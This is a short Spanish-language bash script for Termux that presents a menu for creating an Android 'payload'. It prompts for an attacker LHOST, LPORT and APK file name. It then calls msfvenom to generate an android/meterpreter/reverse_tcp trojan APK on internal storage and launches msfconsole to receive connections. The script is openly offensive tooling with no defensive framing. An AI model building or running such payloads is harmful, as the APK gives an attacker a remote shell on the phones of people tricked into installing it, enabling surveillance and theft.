#!/data/data/com.termux/files/usr/bin/bash

# CREADO POR EDGAR LUCK..[✓]

# COLORES

verde='\033[32m'
amarillo='\033[33m'
magenta='\033[1;35m'
rojo='\033[31m'
blanco='\033[37m'

clear
sleep 1
# creando payload para andorid
echo -e ${blanco}"+                                                     +"
sleep 0.8
echo -e ${magenta}"+                       ++++++++++++                  +" 
sleep 0.8
echo -e ${verde}"+                       [BIENVENIDO]                  +"
sleep 0.8
echo -e ${magenta}"+                       ++++++++++++                  +"
sleep 0.8
echo -e ${blanco}"+                                                     +"
sleep 0.8
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++      •"
sleep 0.8
echo -e ${verde}"+            [ Herramienta para crear payload  ]      +"
sleep 0.8
echo -e ${magenta}"+            +++++++++++++++++++++++++++++++++++      +"
echo ""
sleep 0.8
echo -e ${magenta}"+                      ++++++++++++++                 +"
sleep 0.8
echo -e ${verde}"+                      +Para Android+                 +"
sleep 0.8
echo -e ${magenta}"+                      ++++++++++++++                 +"
echo ""
sleep 0.8
echo -e ${verde}"       Elige una opcion :
	
	  [1] Payload para Android"
echo -e ${rojo}"          [2] Salir"${verde}

read -p ">>> " opcion

case $opcion in
	1)  
	    echo ""
            read -p "Digite tu LHOST: " LHOST
            sleep 1
	    echo ""
	    echo -e ${magenta}"Ejemplo: 4444"${verde}
            read -p "Digite tu LPORT: " LPORT
            sleep 1
	    echo ""
	    echo -e ${magenta}"Ejemplo: Strike.apk"${verde}
	    read -p "Nombre del apk: " apk
	    sleep 1
	    echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT"  R > /sdcard/"$apk"
            sleep 1
	    echo ""
	    echo -e ${verde}"[✓]Payload Generado"
	    sleep 1.5
	    echo ""
	    echo -e ${verde}"[✓]Guardado en la memoria interna"
	    sleep 1.5
	    echo ""
            echo -e ${verde}" Ahora ejecutare metasploit en 7 segundos"
            sleep 2
	    echo ""
            msfconsole
	    echo ""
	    echo -e ${verde}"Hasta pronto ^_^"
	    sleep 1
;;
        2)
		echo -e ${verde}"Hasta Luego ^_^"
		sleep 2
esac
